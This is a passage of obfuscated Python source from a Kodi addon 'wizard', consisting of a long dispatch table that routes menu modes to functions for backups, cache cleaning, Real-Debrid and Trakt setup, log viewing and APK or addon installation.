elif mode =='asciicheck':wiz .asciiCheck ()#line:5622
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5623
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5624
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5625
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5626
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5627
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5628
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5629
elif mode =='currentsettings':viewAdvanced ()#line:5630
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5631
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5632
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5633
elif mode =='fixskin':backtokodi ()#line:5634
elif mode =='testcommand':testcommand ()#line:5635
elif mode =='logsend':logsend ()#line:5636
elif mode =='rdon':rdon ()#line:5637
elif mode =='rdoff':rdoff ()#line:5638
elif mode =='setrd':setrealdebrid ()#line:5639
elif mode =='setrd2':setautorealdebrid ()#line:5640
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5641
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5642
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5643
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5644
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5645
elif mode =='freshstart':freshStart ()#line:5646
elif mode =='forceupdate':wiz .forceUpdate ()#line:5647
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5648
elif mode =='forceclose':wiz .killxbmc ()#line:5649
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5650
elif mode =='hidepassword':wiz .hidePassword ()#line:5651
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5652
elif mode =='enableaddons':enableAddons ()#line:5653
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5654
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5655
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5656
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5657
elif mode =='uploadlog':uploadLog .Main ()#line:5658
elif mode =='viewlog':LogViewer ()#line:5659
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5660
elif mode =='viewerrorlog':errorChecking (all =True )#line:5661
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5662
elif mode =='purgedb':purgeDb ()#line:5663
elif mode =='fixaddonupdate':fixUpdate ()#line:5664
elif mode =='removeaddons':removeAddonMenu ()#line:5665
elif mode =='removeaddon':removeAddon (name )#line:5666
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5667
elif mode =='removedata':removeAddonData (name )#line:5668
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5669
elif mode =='systeminfo':systemInfo ()#line:5670
elif mode =='restorezip':restoreit ('build')#line:5671
elif mode =='restoregui':restoreit ('gui')#line:5672
elif mode =='restoreaddon':restoreit ('addondata')#line:5673
elif mode =='restoreextzip':restoreextit ('build')#line:5674
elif mode =='restoreextgui':restoreextit ('gui')#line:5675
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5676
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5677
elif mode =='traktsync':traktsync ()#line:5678
elif mode =='apk':apkMenu (name )#line:5680
elif mode =='apkscrape':apkScraper (name )#line:5681
elif mode =='apkinstall':apkInstaller (name ,url )#line:5682
elif mode =='speed':speedMenu ()#line:5683
elif mode =='net':net_tools ()#line:5684
elif mode =='GetList':GetList (url )#line:5685
elif mode =='youtube':youtubeMenu (name )#line:5686
elif mode =='viewVideo':playVideo (url )#line:5687
elif mode =='addons':addonMenu (name )#line:5689
elif mode =='addoninstall':addonInstaller (name ,url )#line:5690
elif mode =='savedata':saveMenu ()#line:5692
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5693
elif mode =='managedata':manageSaveData (name )#line:5694
elif mode =='whitelist':wiz .whiteList (name )#line:5695
elif mode =='trakt':traktMenu ()#line:5697
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5698
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5699
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5700
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5701
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5702
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5703
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5704
elif mode =='realdebrid':realMenu ()#line:5706
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5707
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5708
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5709
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5710
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5711
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5712
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5713
elif mode =='login':loginMenu ()#line:5715
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5716
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5717
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5718
elif mode =='clearlogin':loginit .clearSaved (name )#line:5719
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5720
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5721
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5722
elif mode =='contact':notify .contact (CONTACT )#line:5724
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5725
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5726
elif mode =='developer':developer ()#line:5728
elif mode =='converttext':wiz .convertText ()#line:5729
elif mode =='createqr':wiz .createQR ()#line:5730
elif mode =='testnotify':testnotify ()#line:5731
elif mode =='testnotify2':testnotify2 ()#line:5732
elif mode =='servicemanual':servicemanual ()#line:5733
elif mode =='fastinstall':fastinstall ()#line:5734
elif mode =='testupdate':testupdate ()#line:5735
elif mode =='testfirst':testfirst ()#line:5736
elif mode =='testfirstrun':testfirstRun ()#line:5737
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5738
elif mode =='bg':wiz .bg_install (name ,url )#line:5740
elif mode =='bgcustom':wiz .bg_custom ()#line:5741
elif mode =='bgremove':wiz .bg_remove ()#line:5742
elif mode =='bgdefault':wiz .bg_default ()#line:5743
elif mode =='rdset':rdsetup ()#line:5744
elif mode =='mor':morsetup ()#line:5745
elif mode =='mor2':morsetup2 ()#line:5746
elif mode =='resolveurl':resolveurlsetup ()#line:5747
elif mode =='urlresolver':urlresolversetup ()#line:5748
elif mode =='forcefastupdate':forcefastupdate ()#line:5749
elif mode =='traktset':traktsetup ()#line:5750
elif mode =='placentaset':placentasetup ()#line:5751
elif mode =='flixnetset':flixnetsetup ()#line:5752
elif mode =='reptiliaset':reptiliasetup ()#line:5753
elif mode =='yodasset':yodasetup ()#line:5754
elif mode =='numbersset':numberssetup ()#line:5755
elif mode =='uranusset':uranussetup ()#line:5756
elif mode =='genesisset':genesissetup ()#line:5757
elif mode =='fastupdate':fastupdate ()#line:5758
elif mode =='folderback':folderback ()#line:5759
elif mode =='menudata':Menu ()#line:5760
elif mode ==2 :#line:5762
        wiz .torent_menu ()#line:5763
elif mode ==3 :#line:5764
        wiz .popcorn_menu ()#line:5765
elif mode ==8 :#line:5766
        wiz .metaliq_fix ()#line:5767
elif mode ==9 :#line:5768
        wiz .quasar_menu ()#line:5769
elif mode ==5 :#line:5770
        swapSkins ('skin.Premium.mod')#line:5771
elif mode ==13 :#line:5772
        wiz .elementum_menu ()#line:5773
elif mode ==16 :#line:5774
        wiz .fix_wizard ()#line:5775
elif mode ==17 :#line:5776
        wiz .last_play ()#line:5777
elif mode ==18 :#line:5778
        wiz .normal_metalliq ()#line:5779
elif mode ==19 :#line:5780
        wiz .fast_metalliq ()#line:5781
elif mode ==20 :#line:5782
        wiz .fix_buffer2 ()#line:5783
elif mode ==21 :#line:5784
        wiz .fix_buffer3 ()#line:5785
elif mode ==11 :#line:5786
        wiz .fix_buffer ()#line:5787
elif mode ==15 :#line:5788
        wiz .fix_font ()#line:5789
elif mode ==14 :#line:5790
        wiz .clean_pass ()#line:5791
elif mode ==22 :#line:5792
        wiz .movie_update ()#line:5793
elif mode =='adv_settings':buffer1 ()#line:5794
elif mode =='getpass':getpass ()#line:5795
elif mode =='setpass':setpass ()#line:5796
elif mode =='setuname':setuname ()#line:5797
elif mode =='passandUsername':passandUsername ()#line:5798
elif mode =='9':disply_hwr ()#line:5799
elif mode =='99':disply_hwr2 ()#line:5800
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))